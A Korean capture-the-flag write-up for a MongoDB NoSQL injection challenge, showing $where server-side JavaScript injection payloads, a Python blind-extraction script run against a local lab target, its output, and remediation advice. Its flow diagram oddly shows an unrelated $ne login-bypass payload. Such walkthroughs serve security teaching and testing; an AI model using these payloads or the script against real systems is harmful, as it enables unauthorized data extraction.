+++
title = "VulnABLE CTF [LUXORA] Write-up: NoSQL Injection 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "NoSQL Injection", "Gold", "SSJS", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: NoSQL Injection 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (NoSQLi)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/nosqli/gold`
- **목표**: 입력값 타입 검증이 완벽하게 된 환경에서, MongoDB의 `$where` 연산자를 노린 Server-Side JavaScript (SSJS) Injection을 통해 내부 플래그를 추출하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어벽 우회 탐색 (Reconnaissance)

`/nosqli/gold` 는 특정 할인 코드(Coupon Code)를 입력받는 API 엔드포인트입니다.
```http
GET /nosqli/gold?code=SALE50
```

응답 (성공 시):
```json
{"success": true, "message": "Coupon Applied!"}
```

이전 난이도의 공격을 시도해봅니다.
* `code[$ne]=1` (객체 주입 시도) ➔ 실패 (String 검증 통과 못함)
* `code=^S.*` (정규식 주입 시도) ➔ 실패 (일반 문자열로 취급되어 매칭 안 됨)

**[해커의 사고 과정]**
1. 객체 주입도 안 되고 정규식 자동 파싱도 막혔다. 개발자가 꽤 신경 썼다.
2. 하지만 쿠폰 코드를 검증할 때, "현재 사용 중인 유저의 등급이나 날짜 등을 동적으로 판단"하기 위해 MongoDB의 **`$where`** 연산자를 썼을 가능성이 있다.
3. `$where` 안에서는 자바스크립트가 실행된다. 따옴표를 깨서 자바스크립트 논리를 조작해보자.

---

## 💥 2. 취약점 검증 (SSJS Injection Identification)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --({"username":{"$ne":null}, "password":{"$ne":null}})--> [ NoSQL DB ]
                                                                       |-- Condition is True
                                                                       |-- Returns Admin Record
```


백엔드 쿼리가 대략 이럴 것이라 가정합니다.
```javascript
db.coupons.findOne({ $where: "this.code == '" + req.query.code + "'" })
```

자바스크립트 문법을 깨고 무조건 참(True)을 반환하게 만들어 봅니다.
입력창에 `1' || '1'=='1` 을 넣습니다. (URL 인코딩 됨)

### 페이로드 전송
```http
GET /nosqli/gold?code=1'%20||%20'1'=='1
```

### 서버의 응답
```json
{"success": true, "message": "Coupon Applied!"}
```

**[해석 및 결론]**
`1' || '1'=='1` 이라는 유효하지 않은 쿠폰 코드를 넣었음에도 쿠폰이 적용되었습니다! 
이는 백엔드에서 코드가 `this.code == '1' || '1'=='1'` 로 해석되어, 자바스크립트 조건문이 무조건 `True`를 리턴했기 때문입니다. **SSJS Injection** 취약점이 완벽하게 증명되었습니다.

---

## 🚀 3. 플래그 블라인드 추출 (Exploitation)

우리의 목표는 단순히 `True`를 만드는 것이 아니라 `flag` 필드의 값을 알아내는 것입니다.
자바스크립트 정규표현식 매칭 함수인 `.match()`를 이용하여 한 글자씩 유추해낼 수 있습니다.

### 💡 데이터 추출 페이로드 논리
만약 쿠폰 컬렉션 안에 플래그가 들어있다면, `this.flag` 에 접근할 수 있습니다.
- `1' || this.flag.match(/^F/) || '1'=='0`

이 구문이 서버에 들어가면:
`this.code == '1' || this.flag.match(/^F/) || '1'=='0'` 이 됩니다.
만약 플래그가 `F`로 시작한다면, 이 자바스크립트는 `True`를 반환하고 화면에 "Coupon Applied!"가 뜰 것입니다.

### 💻 Python 자동화 스크립트 작성
수작업은 무리이므로 파이썬 스크립트를 작성합니다.

```python
import requests
import string
import time

url = "http://localhost:3000/nosqli/gold"
chars = string.ascii_letters + string.digits + "{}_"
flag = "^"

print("[*] Starting SSJS Blind Data Extraction...")

while True:
    for char in chars:
        # 자바스크립트 논리를 조작하는 페이로드
        payload = f"1' || this.flag.match(/{flag + char}/) || '1'=='0"
        
        try:
            res = requests.get(f"{url}?code={payload}")
            
            # Coupon Applied! 가 나오면 이 글자가 맞음
            if "Coupon Applied" in res.text:
                flag += char
                print(f"[+] Discovered: {flag.replace('^', '')}")
                break
        except Exception as e:
            time.sleep(1)
            
    if flag.endswith("}"):
        break

print(f"\n[!] Final Extracted Flag: {flag.replace('^', '')}")
```

### 스크립트 구동 결과
파이썬 스크립트가 MongoDB 안에서 실행되는 자바스크립트를 원격으로 조종하며 플래그를 뽑아냅니다.

```text
[*] Starting SSJS Blind Data Extraction...
[+] Discovered: F
[+] Discovered: FL
...
[+] Discovered: FLAG{NOSQL_🥇_SSJS_EVAL_C9F3D2}

[!] Final Extracted Flag: FLAG{NOSQL_🥇_SSJS_EVAL_C9F3D2}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

입력값의 타입(Type)을 강제했음에도 불구하고, NoSQL 쿼리 내부에 내장된 자바스크립트 엔진(`$where`)의 취약점을 파고들어 원격 코드 실행(RCE)에 준하는 데이터 유출을 성공시켰습니다.

**🔥 획득한 플래그:**
`FLAG{NOSQL_🥇_SSJS_EVAL_C9F3D2}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
MongoDB의 `$where` 연산자는 동적 쿼리 작성을 편하게 해주지만, 내부적으로 자바스크립트의 `eval()`과 동일하게 동작하는 매우 낡고 위험한 기능입니다.

* **취약한 설계**
```javascript
// 입력값을 자바스크립트 실행 컨텍스트에 직접 결합
db.coupons.findOne({ $where: "this.code == '" + req.query.code + "'" });
```

* **안전한 패치 코드 (기본 연산자 활용 또는 $expr 사용)**
가장 좋은 방어는 `$where`를 아예 쓰지 않는 것입니다.
```javascript
// 안전한 일반 쿼리
db.coupons.findOne({ code: req.query.code });

// 복잡한 연산이 필요하다면 $expr 연산자(Aggregation) 사용
db.coupons.findOne({ $expr: { $eq: ["$code", req.query.code] } });
```
만약 어쩔 수 없이 써야 한다면, 데이터베이스 설정(`mongod.conf`)에서 `security.javascriptEnabled: false` 로 설정하여 서버 사이드 자바스크립트 실행을 완전히 차단하는 것이 가장 확실한 보안 조치입니다.